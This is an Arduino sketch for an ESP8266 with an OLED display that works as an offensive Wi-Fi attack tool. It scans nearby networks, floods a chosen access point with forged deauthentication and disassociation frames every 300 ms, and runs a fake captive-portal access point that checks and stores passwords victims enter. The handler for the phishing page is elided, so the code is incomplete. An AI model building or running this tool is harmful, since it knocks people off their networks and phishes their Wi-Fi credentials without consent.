#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
#include "user_interface.h"
int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// Konfigurasi OLED 64x48
#define SCREEN_WIDTH 64
#define SCREEN_HEIGHT 48
#define OLED_RESET    -1 
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pin LED untuk fitur Blink
#define LED_PIN 2 // LED internal ESP8266 (GPIO2)

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;
String _whitelistMAC = "";
String _correct = "";
String _tryPassword = "";
bool hotspot_active = false;
bool deauthing_active = false;
unsigned long now = 0;
unsigned long deauth_now = 0;

// Fungsi Tampilan OLED ala Nethercap
void updateOLED(String msg) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("NETHERCAP");
  display.println("---------");
  display.println(msg);
  if(deauthing_active) display.println("ATTACKING!");
  if(hotspot_active)   display.println("EVIL-ON");
  display.display();
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

void performScan() {
  int n = WiFi.scanNetworks();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _networks[i].ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) _networks[i].bssid[j] = WiFi.BSSID(i)[j];
      _networks[i].ch = WiFi.channel(i);
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><body style='background:#000;color:red;'><h1>WRONG!</h1></body></html>");
    updateOLED("WRONG PASS");
  } else {
    _correct = "PASS: " + _tryPassword;
    hotspot_active = false;
    deauthing_active = false;
    updateOLED("PW FOUND!");
    webServer.send(200, "text/html", "<html><body style='background:#000;color:green;'><h1>SUCCESS!</h1></body></html>");
  }
}

void handleIndex() {
  if (webServer.hasArg("wl")) _whitelistMAC = webServer.arg("wl");
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        updateOLED("SEL: " + _selectedNetwork.ssid);
      }
    }
  }
  if (webServer.hasArg("deauth")) deauthing_active = (webServer.arg("deauth") == "start");
  
  // Logic Evil Twin & Phishing (sama seperti sebelumnya)
  // ... (Sesuai kode sebelumnya untuk handleIndex)
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  
  // Inisialisasi OLED
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { // Alamat I2C umum 0x3C
    for(;;); 
  }
  updateOLED("STARTING...");

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("GMpro", "sangkur87");
  dnsServer.start(DNS_PORT, "*", apIP);
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.begin();
  
  updateOLED("READY");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Efek Blink saat menyerang
  if (deauthing_active) {
    digitalWrite(LED_PIN, (millis() / 100) % 2); // Blink cepat
  } else {
    digitalWrite(LED_PIN, HIGH); // LED Mati (Active Low)
  }

  // Serangan Deauth Powerfull (300ms)
  if (deauthing_active && millis() - deauth_now >= 300) { 
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t packet[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&packet[10], _selectedNetwork.bssid, 6);
    memcpy(&packet[16], _selectedNetwork.bssid, 6);
    
    wifi_send_pkt_freedom(packet, sizeof(packet), 0); // Deauth
    packet[0] = 0xA0; // Disassociate
    wifi_send_pkt_freedom(packet, sizeof(packet), 0);
    
    deauth_now = millis();
  }

  if (millis() - now >= 5000) {
    performScan();
    now = millis();
    if(!deauthing_active && !hotspot_active) updateOLED("SCANNING...");
  }
}
